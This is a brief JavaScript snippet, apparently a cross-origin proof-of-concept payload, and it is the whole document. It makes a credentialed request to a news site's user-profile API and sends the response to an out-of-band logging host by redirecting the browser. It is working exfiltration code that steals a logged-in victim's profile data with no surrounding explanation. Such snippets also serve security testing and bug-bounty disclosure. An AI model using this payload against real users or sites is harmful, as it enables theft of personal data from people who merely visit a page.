var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.20min.ch/user/v1/profile',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//cm2p1qe2vtc0000c1paggkbmy5ayyyyyb.oast.fun/log?key='+this.responseText; 
};
